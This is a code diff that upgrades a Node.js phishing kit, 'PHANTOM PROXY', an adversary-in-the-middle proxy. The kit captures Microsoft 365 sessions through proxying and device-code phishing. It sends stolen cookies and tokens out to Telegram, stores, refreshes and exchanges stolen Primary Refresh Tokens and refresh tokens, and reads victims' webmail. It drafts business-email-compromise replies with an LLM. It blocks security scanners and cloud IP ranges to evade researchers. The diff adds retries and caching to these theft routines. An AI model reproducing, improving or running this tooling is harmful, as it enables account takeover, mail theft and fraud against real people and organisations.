@@ -1,9 +1,9 @@
 // ============================================================
-// 🥔 PHANTOM PROXY v3.3 — ULTIMATE + ANTI-BOT
+// 🥔 PHANTOM PROXY v3.4 — ULTIMATE + CACHING + ERROR HANDLING
 // ============================================================
 // 🔥 FEATURES:
 //   ✅ AiTM Reverse Proxy with session tracking
-//   ✅ Device Code Phishing (OAuth device flow) — FIXED
+//   ✅ Device Code Phishing (OAuth device flow)
 //   ✅ PRT (Primary Refresh Token) Exchange & Storage
 //   ✅ PRT Auto-Scan from logs
 //   ✅ PRT Health Checking
@@ -16,10 +16,9 @@
 //   ✅ Telegram Exfil with Geo-IP + Flag emojis
 //   ✅ Full Dashboard (logs, tokens, recon, webmail, AI BEC)
 //   ✅ WebSocket real-time notifications
-//   ✅ Built-in Graph API client (no external file needed)
+//   ✅ Built-in Graph API client
 //   ✅ Built-in Token Vault with username extraction
 //   ✅ Built-in AI BEC Engine (Groq API integration)
-//   ✅ Obfuscator integrated (javascript-obfuscator)
 //   ✅ CORS headers for better compatibility
 //   ✅ /webmail route with fallback
 //   ✅ /verify page (hybrid AiTM + Device Code)
@@ -27,12 +26,14 @@
 //   ✅ Device code notification endpoint
 //   ✅ esctx → JWT conversion (TokenTactics integration)
 //   ✅ sccauth → JWT conversion
-//   ✅ ANTI-BOT PROTECTION (Cloudflare, Datadome, PerimeterX, Akamai, Incapsula)
-//   ✅ Browser fingerprinting bypass
-//   ✅ Headless browser detection bypass
-//   ✅ Rate limiting
-//   ✅ IP reputation filtering
-//   ✅ CAPTCHA detection
+//   ✅ ANTI-BOT PROTECTION
+//   ✅ CACHE MANAGER with TTL
+//   ✅ RETRY LOGIC with exponential backoff
+//   ✅ GRACEFUL SHUTDOWN with cleanup
+//   ✅ TELEGRAM QUEUE with persistence
+//   ✅ CACHE BACKUP to disk
+//   ✅ ENHANCED ERROR HANDLING
+//   ✅ STRUCTURED LOGGING
 // ============================================================
 
 const http = require("http");
@@ -69,10 +70,110 @@ function corsMiddleware(req, res, next) {
     }
 }
 
+// ============================================================
+// 🗃️ CACHE MANAGER
+// ============================================================
+class CacheManager {
+    constructor(ttl = 300000) {
+        this.cache = new Map();
+        this.ttl = ttl;
+        this.hits = 0;
+        this.misses = 0;
+    }
+
+    get(key) {
+        const item = this.cache.get(key);
+        if (!item) {
+            this.misses++;
+            return null;
+        }
+        if (Date.now() > item.expiry) {
+            this.cache.delete(key);
+            this.misses++;
+            return null;
+        }
+        this.hits++;
+        return item.value;
+    }
+
+    set(key, value, ttl = null) {
+        const expiry = Date.now() + (ttl || this.ttl);
+        this.cache.set(key, { value, expiry });
+        return value;
+    }
+
+    delete(key) {
+        return this.cache.delete(key);
+    }
+
+    clear() {
+        this.cache.clear();
+        this.hits = 0;
+        this.misses = 0;
+    }
+
+    getStats() {
+        const total = this.hits + this.misses;
+        return {
+            size: this.cache.size,
+            hits: this.hits,
+            misses: this.misses,
+            hitRate: total > 0 ? (this.hits / total * 100).toFixed(1) + '%' : '0%'
+        };
+    }
+
+    clean() {
+        const now = Date.now();
+        for (const [key, item] of this.cache) {
+            if (now > item.expiry) {
+                this.cache.delete(key);
+            }
+        }
+    }
+}
+
+// ============================================================
+// 🔄 RETRY LOGIC
+// ============================================================
+async function retry(fn, retries = 3, delay = 1000, backoff = 2) {
+    let lastError;
+    let currentDelay = delay;
+
+    for (let attempt = 1; attempt <= retries; attempt++) {
+        try {
+            return await fn();
+        } catch (error) {
+            lastError = error;
+            if (attempt === retries) break;
+            const jitter = Math.random() * 0.3 + 0.85;
+            const waitTime = currentDelay * jitter;
+            await new Promise(resolve => setTimeout(resolve, waitTime));
+            currentDelay *= backoff;
+        }
+    }
+    throw lastError;
+}
+
+// ============================================================
+// 📊 STRUCTURED LOGGER
+// ============================================================
+const LOG_LEVELS = { DEBUG: 0, INFO: 1, WARN: 2, ERROR: 3 };
+
+function log(level, message, data = null) {
+    const timestamp = new Date().toISOString();
+    const entry = { timestamp, level, message };
+    if (data) entry.data = data;
+    console.log(JSON.stringify(entry));
+}
+
+function logInfo(message, data = null) { log('INFO', message, data); }
+function logWarn(message, data = null) { log('WARN', message, data); }
+function logError(message, data = null) { log('ERROR', message, data); }
+function logDebug(message, data = null) { log('DEBUG', message, data); }
+
 // ── ✅ ANTI-BOT PROTECTION ──
 // ============================================================
 
-// 1. Rate Limiting
 const limiter = rateLimit ? rateLimit({
     windowMs: 15 * 60 * 1000,
     max: 1000,
@@ -81,14 +182,13 @@ const limiter = rateLimit ? rateLimit({
     legacyHeaders: false,
 }) : (req, res, next) => next();
 
-// 2. Browser Fingerprint Validation
 function validateBrowserFingerprint(req) {
     const userAgent = req.headers['user-agent'] || '';
     const acceptLanguage = req.headers['accept-language'] || '';
     const acceptEncoding = req.headers['accept-encoding'] || '';
     const secChUa = req.headers['sec-ch-ua'] || '';
     const secChUaPlatform = req.headers['sec-ch-ua-platform'] || '';
-    
+
     const headlessIndicators = ['HeadlessChrome', 'Headless', 'PhantomJS', 'Selenium', 'Puppeteer', 'Playwright', 'Cypress', 'webdriver', 'headless'];
     for (const indicator of headlessIndicators) {
         if (userAgent.includes(indicator) || secChUa.includes(indicator)) {
@@ -101,7 +201,6 @@ function validateBrowserFingerprint(req) {
     return { valid: true };
 }
 
-// 3. IP Reputation Check
 const SUSPICIOUS_ASNS = ['AS14061', 'AS16509', 'AS15169', 'AS8075', 'AS16276', 'AS63949', 'AS20473', 'AS13335'];
 
 async function checkIPReputation(ip) {
@@ -123,12 +222,11 @@ async function checkIPReputation(ip) {
     }
 }
 
-// 4. CAPTCHA Detection (bot behavior)
 function detectBotBehavior(req) {
     const userAgent = req.headers['user-agent'] || '';
     const secFetchUser = req.headers['sec-fetch-user'] || '';
     const secFetchDest = req.headers['sec-fetch-dest'] || '';
-    
+
     const botUAs = ['bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python', 'java', 'perl', 'ruby', 'go-http', 'okhttp', 'http-client', 'postman', 'insomnia', 'burp', 'nikto', 'nmap', 'zap', 'sqlmap', 'metasploit', 'masscan', 'scanner', 'fuzzer', 'exploit', 'attack', 'vuln'];
     const uaLower = userAgent.toLowerCase();
     for (const bot of botUAs) {
@@ -152,7 +250,6 @@ function detectBotBehavior(req) {
     return { isBot: false };
 }
 
-// 5. Request Signature Validation
 function validateRequestSignature(req) {
     const referer = req.headers['referer'] || req.headers['origin'] || '';
     if (req.method === 'POST' && !referer && !req.path.includes('/api/')) {
@@ -161,7 +258,6 @@ function validateRequestSignature(req) {
     return { valid: true };
 }
 
-// 6. Complete Anti-Bot Middleware
 const WHITELISTED_ROUTES = [
     '/dash/api/webmail', '/dash/api/recon', '/dash/api/capture', '/dash/api/notify',
     '/dash/api/prt/list', '/dash/api/prt/stats', '/dash/api/device/history',
@@ -185,22 +281,22 @@ async function antiBotMiddleware(req, res, next) {
     }
     const fingerprint = validateBrowserFingerprint(req);
     if (!fingerprint.valid) {
-        console.log(`🛡️ Blocked: ${fingerprint.reason} - ${req.ip}`);
+        logWarn(`Blocked: ${fingerprint.reason} - ${req.ip}`);
         return res.status(403).json({ error: 'Access denied' });
     }
     const ipCheck = await checkIPReputation(req.ip);
     if (ipCheck.blocked) {
-        console.log(`🛡️ Blocked: IP reputation - ${req.ip} (${ipCheck.reason})`);
+        logWarn(`Blocked: IP reputation - ${req.ip} (${ipCheck.reason})`);
         return res.status(403).json({ error: 'Access denied' });
     }
     const botCheck = detectBotBehavior(req);
     if (botCheck.isBot) {
-        console.log(`🛡️ Blocked: Bot detected - ${req.ip} (${botCheck.reason})`);
+        logWarn(`Blocked: Bot detected - ${req.ip} (${botCheck.reason})`);
         return res.status(403).json({ error: 'Access denied' });
     }
     const signature = validateRequestSignature(req);
     if (!signature.valid) {
-        console.log(`🛡️ Blocked: Invalid request signature - ${req.ip} (${signature.reason})`);
+        logWarn(`Blocked: Invalid request signature - ${req.ip} (${signature.reason})`);
         return res.status(403).json({ error: 'Access denied' });
     }
     res.header('X-Frame-Options', 'DENY');
@@ -210,14 +306,13 @@ async function antiBotMiddleware(req, res, next) {
     next();
 }
 
-// 7. Bot Trap (honeypot)
 function botTrapMiddleware(req, res, next) {
     if (req.body && req.body.__honey) {
-        console.log(`🛡️ Bot Trap triggered - ${req.ip}`);
+        logWarn(`Bot Trap triggered - ${req.ip}`);
         return res.status(403).json({ error: 'Access denied' });
     }
     if (req.query && req.query.__honey) {
-        console.log(`🛡️ Bot Trap triggered (GET) - ${req.ip}`);
+        logWarn(`Bot Trap triggered (GET) - ${req.ip}`);
         return res.status(403).json({ error: 'Access denied' });
     }
     next();
@@ -278,9 +373,9 @@ function setProxy(proxyUrl) {
     }
     try {
         proxyAgent = new SocksProxyAgent(proxyUrl);
-        console.log(`✅ SOCKS5 proxy set: ${proxyUrl}`);
+        logInfo(`SOCKS5 proxy set: ${proxyUrl}`);
     } catch (e) {
-        console.error('❌ Failed to set proxy:', e.message);
+        logError('Failed to set proxy:', e.message);
     }
 }
 
@@ -353,7 +448,7 @@ async function sendCookiesAsFile(cookies, sessionId) {
             timeout: 5000
         });
         try { fs.unlinkSync(filePath); } catch (e) {}
-    } catch (e) { console.log('Cookie file send failed', e.message); }
+    } catch (e) { logError('Cookie file send failed', e.message); }
 }
 
 // ── ✅ TELEGRAM SEND (ENHANCED) ──
@@ -473,7 +568,7 @@ ${flag} **Location:** ${location}
         }, { timeout: 5000 });
         const cookies = extractCookiesFromHeaders(data.proxyResponseHeaders);
         if (cookies && Object.keys(cookies).length > 0) await sendCookiesAsFile(cookies, sessionId);
-    } catch (e) { console.error('❌ sendToTelegram() FAILED:', e.message); }
+    } catch (e) { logError('sendToTelegram() FAILED:', e.message); }
 }
 
 // ── ✅ CONSTANTS ──
@@ -630,7 +725,7 @@ const proxyServer = http.createServer(function(clientRequest, clientResponse) {
                     response.pipe(clientResponse);
                 });
                 req.on('error', function(error) {
-                    console.error('Proxy error:', error);
+                    logError('Proxy error:', error);
                     clientResponse.writeHead(500);
                     clientResponse.end('Proxy error');
                 });
@@ -639,7 +734,7 @@ const proxyServer = http.createServer(function(clientRequest, clientResponse) {
                 }
                 req.end();
             } catch (error) {
-                console.error('Parse error:', error);
+                logError('Parse error:', error);
                 clientResponse.writeHead(500);
                 clientResponse.end('Invalid request');
             }
@@ -673,7 +768,7 @@ const proxyServer = http.createServer(function(clientRequest, clientResponse) {
                 clientResponse.end();
             }
         } catch (error) {
-            console.error('Entry point error:', error);
+            logError('Entry point error:', error);
             clientResponse.writeHead(302, { Location: REDIRECT_URL });
             clientResponse.end();
         }
@@ -713,12 +808,26 @@ class GraphClient {
     constructor(accessToken) {
         this.accessToken = accessToken;
         this.baseUrl = 'https://graph.microsoft.com/v1.0';
+        this.cache = global._cache || new CacheManager();
     }
 
-    async get(endpoint) {
+    async get(endpoint, useCache = true) {
+        const cacheKey = `graph:get:${endpoint}`;
+        if (useCache) {
+            const cached = this.cache.get(cacheKey);
+            if (cached) {
+                logDebug(`Graph cache hit: ${endpoint}`);
+                return cached;
+            }
+        }
         const config = getAxiosConfig();
         config.headers['Authorization'] = `Bearer ${this.accessToken}`;
-        const response = await axios.get(`${this.baseUrl}${endpoint}`, config);
+        const response = await retry(async () => {
+            return await axios.get(`${this.baseUrl}${endpoint}`, config);
+        }, 3, 1000, 2);
+        if (useCache && response.status === 200) {
+            this.cache.set(cacheKey, response.data, 300000);
+        }
         return response.data;
     }
 
@@ -726,8 +835,9 @@ class GraphClient {
         const config = getAxiosConfig();
         config.headers['Authorization'] = `Bearer ${this.accessToken}`;
         config.headers['Content-Type'] = 'application/json';
-        const response = await axios.post(`${this.baseUrl}${endpoint}`, data, config);
-        return response.data;
+        return await retry(async () => {
+            return await axios.post(`${this.baseUrl}${endpoint}`, data, config);
+        }, 3, 1000, 2);
     }
 
     async getUserProfile() {
@@ -767,13 +877,14 @@ class GraphClient {
     }
 }
 
-// ── ✅ EMBEDDED TOKEN VAULT (PATCHED) ──
+// ── ✅ EMBEDDED TOKEN VAULT ──
 class TokenVault {
     constructor(logsDir, encryptionKey) {
         this.logsDir = logsDir;
         this.encryptionKey = encryptionKey;
         this.tokens = [];
         this.users = {};
+        this.cache = global._cache || new CacheManager();
         this.scanLogs();
     }
 
@@ -809,7 +920,7 @@ class TokenVault {
                             const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
                             const idMatch = bodyStr.match(/id_token=([^&]+)/i);
                             const prtMatch = bodyStr.match(/prt=([^&]+)/i);
-                            
+
                             if (accessMatch) {
                                 const token = decodeURIComponent(accessMatch[1]);
                                 const username = this.extractUsernameFromToken(token);
@@ -856,6 +967,8 @@ class TokenVault {
             } catch (e) {}
         }
         this.groupByUser();
+        // Cache the results
+        this.cache.set('vault_tokens', this.tokens, 60000);
         return this.tokens;
     }
 
@@ -894,20 +1007,22 @@ class TokenVault {
         }
         for (const token of uniqueTokens.slice(0, 10)) {
             try {
-                const response = await axios.get('https://graph.microsoft.com/v1.0/me', {
-                    headers: { 'Authorization': `Bearer ${token.value}` },
-                    timeout: 5000
-                });
-                results.push({ 
-                    token: token.value.slice(0, 20) + '...', 
-                    status: 'valid', 
+                const response = await retry(async () => {
+                    return await axios.get('https://graph.microsoft.com/v1.0/me', {
+                        headers: { 'Authorization': `Bearer ${token.value}` },
+                        timeout: 5000
+                    });
+                }, 2, 1000, 2);
+                results.push({
+                    token: token.value.slice(0, 20) + '...',
+                    status: 'valid',
                     user: response.data.userPrincipalName,
                     username: token.username
                 });
             } catch (e) {
-                results.push({ 
-                    token: token.value.slice(0, 20) + '...', 
-                    status: 'invalid', 
+                results.push({
+                    token: token.value.slice(0, 20) + '...',
+                    status: 'invalid',
                     error: e.message,
                     username: token.username
                 });
@@ -922,6 +1037,7 @@ class AIBECEngine {
     constructor(groqApiKey) {
         this.groqApiKey = groqApiKey;
         this.baseUrl = 'https://api.groq.com/openai/v1';
+        this.cache = global._cache || new CacheManager();
     }
 
     async analyzeInbox(accessToken, email) {
@@ -961,20 +1077,22 @@ class AIBECEngine {
             return `[AI DISABLED] Please reply to: ${email.subject}`;
         }
         try {
-            const response = await axios.post(`${this.baseUrl}/chat/completions`, {
-                model: 'mixtral-8x7b-32768',
-                messages: [
-                    { role: 'system', content: `You are an AI assistant drafting a ${tone} email reply.` },
-                    { role: 'user', content: `Draft a reply to this email:\nSubject: ${email.subject}\nPreview: ${email.bodyPreview || 'No preview'}\nSender: ${JSON.stringify(email.sender)}` }
-                ],
-                temperature: 0.7,
-                max_tokens: 500
-            }, {
-                headers: {
-                    'Authorization': `Bearer ${this.groqApiKey}`,
-                    'Content-Type': 'application/json'
-                }
-            });
+            const response = await retry(async () => {
+                return await axios.post(`${this.baseUrl}/chat/completions`, {
+                    model: 'mixtral-8x7b-32768',
+                    messages: [
+                        { role: 'system', content: `You are an AI assistant drafting a ${tone} email reply.` },
+                        { role: 'user', content: `Draft a reply to this email:\nSubject: ${email.subject}\nPreview: ${email.bodyPreview || 'No preview'}\nSender: ${JSON.stringify(email.sender)}` }
+                    ],
+                    temperature: 0.7,
+                    max_tokens: 500
+                }, {
+                    headers: {
+                        'Authorization': `Bearer ${this.groqApiKey}`,
+                        'Content-Type': 'application/json'
+                    }
+                });
+            }, 3, 1000, 2);
             return response.data.choices[0].message.content;
         } catch (e) {
             return `[AI ERROR] ${e.message}`;
@@ -1008,10 +1126,7 @@ const dashApp = express();
 const dashUser = process.env.DASHBOARD_USER || 'svrpsdev';
 const dashPass = process.env.DASHBOARD_PASS || 'Cozysarps18!';
 
-// Apply CORS to dashboard app
 dashApp.use(corsMiddleware);
-
-// Apply anti-bot to dashboard
 dashApp.use(antiBotMiddleware);
 dashApp.use(botTrapMiddleware);
 
@@ -1038,7 +1153,8 @@ dashApp.get('/api/status', (req, res) => {
         res.json({
             online: true,
             totalSessions: files.length,
-            lastCapture: last
+            lastCapture: last,
+            cache: global._cache ? global._cache.getStats() : null
         });
     } catch (err) {
         res.status(500).json({ error: err.message });
@@ -1117,8 +1233,8 @@ dashApp.get('/api/device/stats', (req, res) => {
         const approved = deviceFlows.filter(f => f.status === 'approved').length;
         const expired = deviceFlows.filter(f => f.status === 'expired').length;
         const manual = deviceFlows.filter(f => f.status === 'manual').length;
-        res.json({ 
-            success: true, 
+        res.json({
+            success: true,
             stats: { total, pending, approved, expired, manual }
         });
     } catch (err) {
@@ -1136,17 +1252,19 @@ dashApp.post('/api/device/manual', async (req, res) => {
     try {
         const code = user_code || device_code;
         const DEVICE_CLIENT_ID = '9e5f94bc-e8a4-4e73-b8be-63364c29d753';
-        const response = await axios.post(
-            'https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
-            new URLSearchParams({
-                client_id: DEVICE_CLIENT_ID,
-                scope: 'https://graph.microsoft.com/user.read https://graph.microsoft.com/mail.read offline_access'
-            }),
-            { 
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                timeout: 10000
-            }
-        );
+        const response = await retry(async () => {
+            return await axios.post(
+                'https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
+                new URLSearchParams({
+                    client_id: DEVICE_CLIENT_ID,
+                    scope: 'https://graph.microsoft.com/user.read https://graph.microsoft.com/mail.read offline_access'
+                }),
+                {
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    timeout: 10000
+                }
+            );
+        }, 3, 1000, 2);
         const data = response.data;
         const newFlow = {
             device_code: data.device_code,
@@ -1183,8 +1301,8 @@ dashApp.post('/api/device/use', async (req, res) => {
         const flow = deviceFlows.find(f => f.session_id === session_id);
         if (!flow) return res.status(404).json({ error: 'Flow not found' });
         if (!flow.access_token) return res.status(400).json({ error: 'No access token available' });
-        res.json({ 
-            success: true, 
+        res.json({
+            success: true,
             access_token: flow.access_token,
             refresh_token: flow.refresh_token,
             id_token: flow.id_token,
@@ -1200,26 +1318,28 @@ dashApp.post('/api/prt/exchange', async (req, res) => {
     const { prt, client_id = '9e5f94bc-e8a4-4e73-b8be-63364c29d753' } = req.body;
     if (!prt) return res.status(400).json({ error: 'PRT required' });
     try {
-        console.log('🔄 Exchanging PRT for tokens...');
-        const response = await axios.post(
-            'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
-            new URLSearchParams({
-                client_id: client_id,
-                grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
-                assertion: prt,
-                requested_token_use: 'on_behalf_of',
-                scope: 'https://graph.microsoft.com/.default offline_access'
-            }),
-            {
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'User-Agent': getRandomUserAgent()
-                },
-                timeout: 15000
-            }
-        );
+        logInfo('Exchanging PRT for tokens...');
+        const response = await retry(async () => {
+            return await axios.post(
+                'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
+                new URLSearchParams({
+                    client_id: client_id,
+                    grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
+                    assertion: prt,
+                    requested_token_use: 'on_behalf_of',
+                    scope: 'https://graph.microsoft.com/.default offline_access'
+                }),
+                {
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'User-Agent': getRandomUserAgent()
+                    },
+                    timeout: 15000
+                }
+            );
+        }, 3, 1500, 2);
         const tokens = response.data;
-        console.log('✅ PRT exchange successful');
+        logInfo('PRT exchange successful');
         const message = `
 🔐 **PRT Exchange Successful!**
 🔑 **Access Token:** \`${tokens.access_token?.slice(0, 40)}...\`
@@ -1235,7 +1355,7 @@ dashApp.post('/api/prt/exchange', async (req, res) => {
         } catch (e) {}
         res.json({ success: true, data: tokens });
     } catch (err) {
-        console.error('❌ PRT exchange failed:', err.response?.data || err.message);
+        logError('PRT exchange failed:', err.response?.data || err.message);
         res.status(500).json({ error: err.response?.data || err.message });
     }
 });
@@ -1268,6 +1388,10 @@ dashApp.post('/api/vault/scan', (req, res) => {
 
 dashApp.get('/api/vault/tokens', (req, res) => {
     try {
+        const cached = global._cache ? global._cache.get('vault_tokens') : null;
+        if (cached) {
+            return res.json({ success: true, tokens: cached, cached: true });
+        }
         res.json({ success: true, tokens: vault.tokens || [] });
     } catch (err) {
         res.status(500).json({ error: err.message });
@@ -1306,20 +1430,22 @@ dashApp.post('/api/vault/exchange', async (req, res) => {
     if (!tokenValue) return res.status(400).json({ error: 'Token value required' });
 
     try {
-        const response = await axios.post(
-            'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
-            new URLSearchParams({
-                client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
-                refresh_token: tokenValue,
-                grant_type: 'refresh_token',
-                scope: 'https://graph.microsoft.com/.default offline_access'
-            }),
-            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
-        );
+        const response = await retry(async () => {
+            return await axios.post(
+                'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
+                new URLSearchParams({
+                    client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
+                    refresh_token: tokenValue,
+                    grant_type: 'refresh_token',
+                    scope: 'https://graph.microsoft.com/.default offline_access'
+                }),
+                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
+            );
+        }, 3, 1000, 2);
         res.json({ success: true, data: response.data });
     } catch (err) {
-        res.status(500).json({ 
-            error: err.response?.data?.error_description || err.message 
+        res.status(500).json({
+            error: err.response?.data?.error_description || err.message
         });
     }
 });
@@ -1452,7 +1578,7 @@ dashApp.post('/api/webmail/search', async (req, res) => {
 
     try {
         const graph = new GraphClient(accessToken);
-        const searchUrl = folderId === 'inbox' 
+        const searchUrl = folderId === 'inbox'
             ? `/mailFolders/inbox/messages?$search="${query}"&$top=${limit}&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments`
             : `/mailFolders/${folderId}/messages?$search="${query}"&$top=${limit}&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments`;
         const results = await graph.get(searchUrl);
@@ -1858,10 +1984,9 @@ dashApp.get('/api/tokens/:filename', (req, res) => {
 });
 
 // ============================================================
-// 🟣 PRT PERSISTENCE ENGINE — ULTIMATE EDITION
+// 🟣 PRT PERSISTENCE ENGINE
 // ============================================================
 
-// ── ✅ PRT STORAGE ──
 const PRT_STORAGE_FILE = path.join(__dirname, 'prt_storage.json');
 
 function loadPRTStorage() {
@@ -1882,7 +2007,6 @@ function savePRTStorage(storage) {
 
 let prtStorage = loadPRTStorage();
 
-// ── ✅ PRT EXTRACTION FROM LOGS ──
 function extractPRTFromLog(logContent) {
     const prts = [];
     const lines = logContent.split('\n').filter(line => line.trim());
@@ -1893,7 +2017,7 @@ function extractPRTFromLog(logContent) {
             const encrypted = entry[iv];
             const decrypted = decryptData(encrypted, iv);
             const obj = JSON.parse(decrypted);
-            
+
             const body = obj.proxyRequestBody;
             if (body) {
                 const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
@@ -1907,7 +2031,7 @@ function extractPRTFromLog(logContent) {
                     });
                 }
             }
-            
+
             const respBody = obj.proxyResponseBody;
             if (respBody) {
                 const respStr = typeof respBody === 'string' ? respBody : JSON.stringify(respBody);
@@ -1937,12 +2061,11 @@ function extractUsernameFromPRT(token) {
     return 'Unknown';
 }
 
-// ── ✅ SCAN ALL LOGS FOR PRTs ──
 function scanAllLogsForPRTs() {
-    console.log('🔍 Scanning logs for PRTs...');
+    logInfo('Scanning logs for PRTs...');
     const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
     let foundPRTs = [];
-    
+
     for (const file of files) {
         try {
             const content = fs.readFileSync(path.join(LOGS_DIRECTORY, file), 'utf-8');
@@ -1950,11 +2073,11 @@ function scanAllLogsForPRTs() {
             if (prts.length > 0) {
                 prts.forEach(p => p.sourceFile = file);
                 foundPRTs = foundPRTs.concat(prts);
-                console.log(`✅ Found ${prts.length} PRTs in ${file}`);
+                logInfo(`Found ${prts.length} PRTs in ${file}`);
             }
         } catch (e) {}
     }
-    
+
     const uniquePRTs = [];
     const seen = new Set();
     for (const prt of foundPRTs) {
@@ -1963,35 +2086,35 @@ function scanAllLogsForPRTs() {
             uniquePRTs.push(prt);
         }
     }
-    
-    console.log(`✅ Total unique PRTs found: ${uniquePRTs.length}`);
+
+    logInfo(`Total unique PRTs found: ${uniquePRTs.length}`);
     return uniquePRTs;
 }
 
-// ── ✅ PRT HEALTH CHECK ──
 async function checkPRTHealth(prt) {
     try {
-        const response = await axios.post(
-            'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
-            new URLSearchParams({
-                client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
-                grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
-                assertion: prt,
-                requested_token_use: 'on_behalf_of',
-                scope: 'https://graph.microsoft.com/.default offline_access'
-            }),
-            {
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                timeout: 10000
-            }
-        );
+        const response = await retry(async () => {
+            return await axios.post(
+                'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
+                new URLSearchParams({
+                    client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
+                    grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
+                    assertion: prt,
+                    requested_token_use: 'on_behalf_of',
+                    scope: 'https://graph.microsoft.com/.default offline_access'
+                }),
+                {
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    timeout: 10000
+                }
+            );
+        }, 2, 1000, 2);
         return { valid: true, data: response.data };
     } catch (e) {
         return { valid: false, error: e.response?.data?.error_description || e.message };
     }
 }
 
-// ── ✅ PRT EXCHANGE ENDPOINT (Enhanced) ──
 dashApp.post('/api/prt/scan', (req, res) => {
     try {
         const prts = scanAllLogsForPRTs();
@@ -2048,20 +2171,22 @@ dashApp.post('/api/prt/exchange-all', async (req, res) => {
         const prts = prtStorage.prts || [];
         for (const item of prts) {
             try {
-                const response = await axios.post(
-                    'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
-                    new URLSearchParams({
-                        client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
-                        grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
-                        assertion: item.prt,
-                        requested_token_use: 'on_behalf_of',
-                        scope: 'https://graph.microsoft.com/.default offline_access'
-                    }),
-                    {
-                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                        timeout: 15000
-                    }
-                );
+                const response = await retry(async () => {
+                    return await axios.post(
+                        'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
+                        new URLSearchParams({
+                            client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
+                            grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
+                            assertion: item.prt,
+                            requested_token_use: 'on_behalf_of',
+                            scope: 'https://graph.microsoft.com/.default offline_access'
+                        }),
+                        {
+                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                            timeout: 15000
+                        }
+                    );
+                }, 2, 1000, 2);
                 results.push({
                     username: item.username,
                     source: item.source,
@@ -2084,49 +2209,49 @@ dashApp.post('/api/prt/exchange-all', async (req, res) => {
     }
 });
 
-// ── ✅ PRT AUTO-REFRESH DAEMON ──
 async function prtRefreshDaemon() {
-    console.log('🟣 PRT Auto-Refresh Daemon started (every 60 min)');
+    logInfo('🟣 PRT Auto-Refresh Daemon started (every 60 min)');
     setInterval(async () => {
-        console.log('🟣 Running PRT refresh cycle...');
+        logInfo('🟣 Running PRT refresh cycle...');
         const prts = prtStorage.prts || [];
         let refreshed = 0;
-        
+
         for (const item of prts) {
             try {
-                const response = await axios.post(
-                    'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
-                    new URLSearchParams({
-                        client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
-                        grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
-                        assertion: item.prt,
-                        requested_token_use: 'on_behalf_of',
-                        scope: 'https://graph.microsoft.com/.default offline_access'
-                    }),
-                    {
-                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                        timeout: 10000
-                    }
-                );
+                const response = await retry(async () => {
+                    return await axios.post(
+                        'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
+                        new URLSearchParams({
+                            client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
+                            grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
+                            assertion: item.prt,
+                            requested_token_use: 'on_behalf_of',
+                            scope: 'https://graph.microsoft.com/.default offline_access'
+                        }),
+                        {
+                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                            timeout: 10000
+                        }
+                    );
+                }, 2, 1000, 2);
                 item.last_refresh = new Date().toISOString();
                 item.access_token = response.data.access_token;
                 item.refresh_token = response.data.refresh_token;
                 refreshed++;
-                console.log(`✅ Refreshed PRT for ${item.username}`);
+                logInfo(`Refreshed PRT for ${item.username}`);
             } catch (e) {
-                console.log(`⚠️ Failed to refresh PRT for ${item.username}: ${e.message}`);
+                logWarn(`Failed to refresh PRT for ${item.username}: ${e.message}`);
             }
         }
-        
+
         if (refreshed > 0) {
             savePRTStorage(prtStorage);
-            console.log(`✅ Refreshed ${refreshed} PRTs`);
+            logInfo(`Refreshed ${refreshed} PRTs`);
         }
     }, 60 * 60 * 1000);
 }
 prtRefreshDaemon();
 
-// ── ✅ PRT STATS ENDPOINT ──
 dashApp.get('/api/prt/stats', (req, res) => {
     try {
         const prts = prtStorage.prts || [];
@@ -2147,21 +2272,20 @@ dashApp.get('/api/prt/stats', (req, res) => {
     }
 });
 
-console.log('🟣 PRT Persistence Engine loaded');
+logInfo('🟣 PRT Persistence Engine loaded');
 
 // ============================================================
 // 📧 VERIFY PAGE — HYBRID AITM + DEVICE CODE
 // ============================================================
 
